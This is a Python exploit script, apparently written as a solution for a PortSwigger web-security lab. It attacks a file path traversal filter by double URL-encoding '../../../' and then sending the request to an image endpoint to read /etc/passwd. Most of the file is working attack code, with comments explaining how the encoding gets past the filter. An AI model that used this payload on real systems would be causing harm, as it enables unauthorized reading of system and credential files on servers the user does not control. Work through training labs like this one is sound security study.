# Lab 04 — File path traversal, traversal sequences stripped with superfluous URL-decode
# PortSwigger: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
#
# Vulnerability: The app blocks raw traversal sequences, THEN performs its
#                OWN additional URL-decode of the (already-approved) input
#                before actually using it
# Aim:           Retrieve the contents of /etc/passwd
#
# Technique:
#   A single layer of encoding doesn't help — the web server automatically
#   decodes one layer before the filter even runs. Encoding TWICE means the
#   first (automatic) decode still leaves the payload looking harmless to
#   the filter; the application's OWN extra decode (after the filter has
#   already approved it) finishes turning it into a real traversal sequence.
#
#   IMPORTANT: requests will normally URL-encode the payload automatically
#   when passed via params= — but since we need to send an ALREADY
#   percent-encoded string as the literal parameter value (not have it
#   re-encoded), we build the full URL manually here.
#
# Usage: python path_traversal_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from path_traversal_utils import banner, section, make_session, double_url_encode, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TRAVERSAL = "../../../etc/passwd"

if __name__ == "__main__":
    banner()
    section("LAB 04 — TRAVERSAL STRIPPED WITH SUPERFLUOUS URL-DECODE")

    if len(sys.argv) != 2:
        print("  Usage: python path_traversal_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm naive and single-encoded traversal both fail ────────
    print("  ── Step 1: confirm naive traversal is blocked\n")
    r_naive = session.get(f"{url}/image", params={"filename": TRAVERSAL})
    print(f"  ℹ  Naive traversal → status {r_naive.status_code}")

    # ── Step 2: build the double URL-encoded payload manually ────────────────
    print("\n  ── Step 2: build a double URL-encoded traversal payload\n")

    # Double-encode ONLY the traversal portion (../../../), leave "etc/passwd" plain
    encoded_traversal = double_url_encode("../../../")
    full_payload = encoded_traversal + "etc/passwd"

    print(f"  ℹ  Traversal portion encoded twice: {encoded_traversal}")
    print(f"  ℹ  Full payload: {full_payload}\n")

    # ── Step 3: send the request with the RAW (pre-encoded) string ──────────
    # We build the URL manually to prevent `requests` from re-encoding our
    # already-percent-encoded payload a third time.
    full_url = f"{url}/image?filename={full_payload}"
    print(f"  ➜  GET {full_url}\n")

    r = session.get(full_url)
    print(f"  ℹ  Status: {r.status_code}")

    if "root:" in r.text:
        print_box("/etc/passwd contents (truncated)", r.text[:800])
    else:
        print("\n  ✘  /etc/passwd contents not found — inspect manually")
        print_box("Raw response snippet", r.text[:400])

    print()
    print("  ℹ  Encoding chain:")
    print("     ../  →  %2e%2e%2f  (single encode — still gets caught)")
    print("     %2e%2e%2f  →  %252e%252e%252f  (double encode — bypasses)")
    print("     Server's automatic decode only unwraps ONE layer before the")
    print("     filter runs. The application's own SECOND decode (after the")
    print("     filter approved it) turns it into real traversal.")
